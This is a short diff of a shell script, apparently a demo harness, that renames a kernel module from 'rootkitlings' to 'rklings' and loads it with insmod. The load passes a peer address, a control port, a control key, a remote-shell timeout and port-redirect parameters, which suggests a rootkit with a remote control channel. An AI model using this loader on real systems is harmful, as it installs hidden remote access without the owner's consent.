@@ -10,7 +10,7 @@ peer=${2:-}
 control_port=${3:-}
 shell_port=${4:-}
 
-request=/etc/modules-load.d/rootkitlings.conf
+request=/etc/modules-load.d/rklings.conf
 show()
 {
 	ui_transcript "$*"
@@ -39,13 +39,13 @@ ui_heading 'Load request before module load'
 run cat "$request"
 
 run ifconfig lo 127.0.0.1 up
-command='insmod /rootkitlings/rootkitlings.ko'
+command='insmod /rklings/rklings.ko'
 command="$command peer_address=$peer peer_port=$control_port"
 command="$command retry_base_ms=25 retry_max_ms=200"
 command="$command control_key=<redacted> shell_timeout_ms=300000"
 command="$command redirect_from_port=5400 redirect_to_port=5401"
 show "$command"
-insmod /rootkitlings/rootkitlings.ko \
+insmod /rklings/rklings.ko \
 	"peer_address=$peer" \
 	"peer_port=$control_port" \
 	retry_base_ms=25 \
